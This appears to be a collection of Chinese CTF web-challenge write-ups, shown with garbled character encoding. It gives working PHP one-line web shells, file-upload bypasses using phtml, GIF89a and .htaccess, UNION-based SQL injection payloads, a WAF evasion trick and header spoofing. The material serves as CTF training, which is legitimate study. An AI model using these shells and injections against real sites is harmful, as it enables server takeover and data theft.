# 001_[æå®¢å¤§æŒ‘æˆ˜ 2019]Http(HttpåŸºç¡€)

æŸ¥çœ‹æºç æ‰¾åˆ° Secret.php

æ‰“å¼€ Secret.php æŒ‰ç…§è¦æ±‚åˆ†åˆ«ä¼ªé€ 

Refereï¼šhttps://www.Sycsecret.com

X-forwarded-forï¼š127.0.0.1

User-Agentï¼šSyclover

ä¹‹åå‘é€è¯·æ±‚ï¼Œå³å¯è·å–flag


# 002_[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File(PHPåŸºç¡€)

è·å– action.php

ç”±äº action.php ä½¿ç”¨äº†302è·³è½¬ï¼Œæµè§ˆå™¨çœ‹ä¸åˆ°å…·ä½“å†…å®¹ï¼Œä½¿ç”¨ burpsuite è·å– action.php å†…å®¹

å¾—åˆ° secr3t.php

ä¹‹åä½¿ç”¨ file=php://filter/convert.base64-encode/resource=flag.php è·å– base64 ç¼–ç çš„ flag.php

ç„¶åè§£ç è·å–flag

# 003_[ACTF2020 æ–°ç”Ÿèµ›]Upload(æ–‡ä»¶ä¸Šä¼ )  

åˆ é™¤å‰ç«¯ä¸Šä¼ æ£€æµ‹äº‹ä»¶

ä¸Šä¼  phtml æ ¼å¼çš„ä¸€å¥è¯æœ¨é©¬

```phtml
<script language='php'>@eval($_POST['a']);</script>
```

ä½¿ç”¨ä¸­å›½èœåˆ€é“¾æ¥æœåŠ¡å™¨è·å–flag

# 004_[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload(æ–‡ä»¶ä¸Šä¼ ) 

ä½¿ç”¨ BurpSuite ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶å¤´ä¸º `Content-Type: image/jpeg`

ç„¶åä¸Šä¼  

```phtml
GIF89a? <script language='php'>@eval($_POST['a']);</script>
```

ä½¿ç”¨ä¸­å›½èœåˆ€é“¾æ¥æœåŠ¡å™¨è·å–flag

# 005_[RoarCTF 2019]Easy Calc(PHPåŸºç¡€)

## åŸºç¡€çŸ¥è¯†

æˆ‘ä»¬çŸ¥é“PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚ä¾‹å¦‚ï¼š/?foo=barå˜æˆArray([foo] => â€œbarâ€)ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚ä¾‹å¦‚ï¼Œ/?%20news[id%00=42ä¼šè½¬æ¢ä¸ºArray([news_id] => 42)ã€‚å¦‚æœä¸€ä¸ªIDS/IPSæˆ–WAFä¸­æœ‰ä¸€æ¡è§„åˆ™æ˜¯å½“news_idå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªéæ•°å­—çš„å€¼åˆ™æ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š

/news.php?%20news[id%00=42"+AND+1=0â€“

ä¸Šè¿°PHPè¯­å¥çš„å‚æ•°%20news[id%00çš„å€¼å°†å­˜å‚¨åˆ°$_GET[â€œnews_idâ€]ä¸­ã€‚

PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š

```
1.åˆ é™¤ç©ºç™½ç¬¦

2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰
```

å¦‚æœ `http://www.xxx.com/index.php?num = aaaa   //æ˜¾ç¤ºéæ³•è¾“å…¥çš„è¯` åˆ™å¯ä»¥å† `num` å‰åŠ ä¸€ä¸ªç©ºæ ¼ å˜æˆ `http://www.xxx.com/index.php? num = aaaa` 

è¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚

## scandir()

åˆ—å‡º å‚æ•°ç›®å½• ä¸­çš„æ–‡ä»¶å’Œç›®å½•ï¼Œè·å–flagä½ç½®

å¦‚æœç›´æ¥ä½¿ç”¨ `scandir("/")` å‘ç°ä¼šè¢«å±è”½ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `chr(47)` æ¥å¯¹å…¶è¿›è¡Œç»•è¿‡ã€‚

```
?%20num=var_dump(scandir(chr(47)))
```

## è·å–flag

ä¹‹åä½¿ç”¨ `file_get_contents()` æ¥è·å–æ–‡ä»¶å³å¯


```
num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

# 006_[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL(SQLæ³¨å…¥)   


é¦–å…ˆå°è¯•ä¸‡èƒ½å¯†ç 

```
?username=admin'or'1'='1&password=admin'or'1'='1
```

è·å–å¯†ç ï¼Œç›´æ¥æ‹¿è·å–çš„å¯†ç æäº¤flagï¼Œå‘ç°é”™è¯¯ã€‚

æ¥ç€å°è¯•

ç”±äºæ˜¯ url ä¸­è¾“å…¥ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ `#` å¾—ç”¨ `%23`
```
/check.php?username=admin' order by 3%23&password=1     å­˜åœ¨
```

å¯çŸ¥å…±3ä¸ªå­—æ®µã€‚ç”¨ `union` æŸ¥è¯¢æµ‹è¯•æ³¨å…¥ç‚¹ï¼ˆå›æ˜¾ç‚¹ä½ï¼‰ï¼š

```
/check.php?username=1' union select 1,2,3%23&password=1
```

å¾—åˆ°å›æ˜¾ç‚¹ä½ä¸º2å’Œ3ï¼ŒæŸ¥è¯¢å½“å‰æ•°æ®åº“ååŠç‰ˆæœ¬ï¼š

```
/check.php?username=1' union select 1,database(),version()%23&password=1
```

æ¥ä¸‹æ¥æŸ¥è¯¢è¡¨

```
/check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
```

å¾—åˆ° `geekuser` å’Œ `l0ve1ysq1` ä¸¤ä¸ªè¡¨


æŸ¥çœ‹ `l0ve1ysq1` è¡¨å­—æ®µ 

```
/check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&password=1
```

è·å–æ•°æ®ï¼Œæ‹¿åˆ°flag


```
/check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1
```


# 007_[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag

æŸ¥çœ‹æºç  å‘ç° `pay.php`

è¿›å…¥ `pay.php` å‘ç°æç¤ºè¦æ˜¯

```
You must be a student from CUIT!!!
You must be answer the correct password!!!
```

æ‰èƒ½è·å– flag

é¦–å…ˆæŸ¥çœ‹æºç ï¼Œå‘ç° `password` æ˜¯ 404a (ä¸èƒ½æ˜¯404ï¼Œ404ä¼šè¢«æ‹¦æˆª)

```html
<!--
	~~~post money and password~~~
    if (isset($_POST['password'])) {
	    $password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```

ç„¶åæŸ¥çœ‹ `Cookies` å‘ç°æœ‰ä¸€ä¸ª `user` å˜é‡ä¸º 0ï¼Œå°è¯•å°†å…¶ä¿®æ”¹ä¸º 1 ç„¶åæºå¸¦ `password` å‘é€ post è¯·æ±‚ã€‚

å‡ºç°æç¤ºéœ€è¦æ”¯ä»˜ `money`

å† `password` åæ·»åŠ  `money` å­—æ®µè·å–

```
?password=404a&money=100000000 
```

å‡ºç°æç¤º `money` å­—æ®µè¿‡é•¿ï¼Œä¿®æ”¹ 100000000 ä¸ºç§‘å­¦è®¡æ•°æ³•å†æ¬¡å‘é€è¯·æ±‚

```
?password=404a&money=1e9 
```

æˆåŠŸè·å– flag{23e50dfa-f2f3-4b68-bea3-25f96b7acb48}


# 008_[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢(æ–‡ä»¶ä¸Šä¼ )  

## é¢„å¤‡çŸ¥è¯† .htaccessæ˜¯ä»€ä¹ˆ

<br>

> .htaccessæ–‡ä»¶(æˆ–è€…"åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶"ï¼‰æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚
>
> æ¦‚è¿°æ¥è¯´ï¼Œhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚
>
> å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼Œå¹¶å¯ä»¥ç”¨AllowOverrideé™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚å¦‚æœéœ€è¦ä½¿ç”¨.htaccessä»¥å¤–çš„å…¶ä»–æ–‡ä»¶åï¼Œå¯ä»¥ç”¨AccessFileNameæŒ‡ä»¤æ¥æ”¹å˜ã€‚ä¾‹å¦‚ï¼Œéœ€è¦ä½¿ç”¨.config ï¼Œåˆ™å¯ä»¥åœ¨æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æŒ‰ä»¥ä¸‹æ–¹æ³•é…ç½®ï¼šAccessFileName .config ã€‚
>
> ç¬¼ç»Ÿåœ°è¯´ï¼Œ.htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚

## åˆ›å»º .htaccess æ–‡ä»¶


```xml
<!-- æ³¨æ„è¦æŒ‡å®šä½ ä¸Šä¼ çš„æ–‡ä»¶åå’Œæ­¤æ–‡ä»¶åç›¸åŒï¼Œè¿™æ ·å®ƒæ‰èƒ½è¢«å½“ä½œphpæ–‡ä»¶è§£æ -->
<FilesMatch "a.png">
SetHandler application/x-httpd-php
</FilesMatch>
```


è¿™ä¸ªæ–‡ä»¶çš„æ„æ€æ˜¯ å°† `a.png` æ–‡ä»¶å½“ä½œ php æ–‡ä»¶æ¥æ‰§è¡Œ

## ä¸Šä¼  .htaccess æ–‡ä»¶

ä½¿ç”¨ BurpSuite æŠ“åŒ…ä¸Šä¼  .htaccess æ–‡ä»¶

åœ¨ä¸Šä¼ æ—¶éœ€è¦å°† `Content-Type: application/octet-stream` ä¿®æ”¹ä¸º `Content-Type: image/png`

## ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬

```php
<?php eval($_POST['a']);?>
```

å°†å…¶ä¿å­˜ä¸º `a.png` æ–‡ä»¶

ä¹‹åä¸Šä¼ 

```
http://3a79e9c3-e27e-40c9-b6e0-af40d2028543.node4.buuoj.cn:81/upload/c7e27b0181f9d00be86497d5427d8574/a.png
```

ä¸Šä¼ æˆåŠŸåä½¿ç”¨èšå‰‘è¿æ¥ä¸€ä¸‹è·å– flag{677ad6d8-e669-4b94-ad9f-8db2453e338b}


# 009_[æŠ¤ç½‘æ¯ 2018]easy_tornado




